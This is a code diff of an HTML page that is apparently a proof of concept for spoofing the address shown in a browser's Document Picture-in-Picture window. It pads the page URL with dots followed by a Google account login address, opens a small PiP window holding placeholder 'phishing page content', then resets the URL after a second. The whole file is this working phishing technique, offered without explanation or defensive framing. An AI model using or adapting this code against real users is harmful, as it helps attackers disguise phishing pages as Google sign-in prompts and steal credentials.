@@ -1,35 +1,30 @@
-<!DOCTYPE html>
-<html>
+<style>
+    #content {
+        display: none;
+    }
+</style>
 
-<head>
-    <style>
-        #content {
-            display: none;
-        }
-    </style>
-</head>
+<button id="button">Open PIP</button>
 
-<body>
+<div id="content">
+    phishing page content here
+</div>
 
-    <button id="button"> Button</button>
+<script>
+    const pipOpen = async () => {
+        history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
 
-    <div id="content">
-        Press enter
-    </div>
+        const pipWindow = await documentPictureInPicture.requestWindow({
+            width: 330,
+            height: 317
+        });
+        
+        setTimeout(() => {
+            history.replaceState(null, '', '/');
+        }, 1000);
 
-    <script>
-        const spoof = async () => {
+        pipWindow.document.body.append(content);
+    };
 
-            const popupPip = await documentPictureInPicture.requestWindow({
-                width: 350,
-                height: 400
-            });
-
-            popupPip.document.body.append(content);
-        };
-
-        button.onclick = spoof;
-    </script>
-</body>
-
-</html>
+    button.onclick = pipOpen;
+</script>
